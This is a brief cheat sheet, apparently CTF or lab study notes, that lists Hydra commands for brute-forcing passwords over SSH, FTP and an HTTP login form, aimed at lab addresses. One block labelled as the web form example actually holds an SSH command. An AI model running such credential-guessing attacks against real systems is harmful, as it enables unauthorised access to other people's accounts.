### Use to SSH

hydra -l user -P wordlist.txt ssh://10.10.242.212

### FTP
```
hydra -l user -P passlist.txt ftp://MACHINE_IP
```

### POST FORM WEB
```
hydra -l <username> -P <full path to pass> MACHINE_IP -t 4 ssh
```
Exemplo
```
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
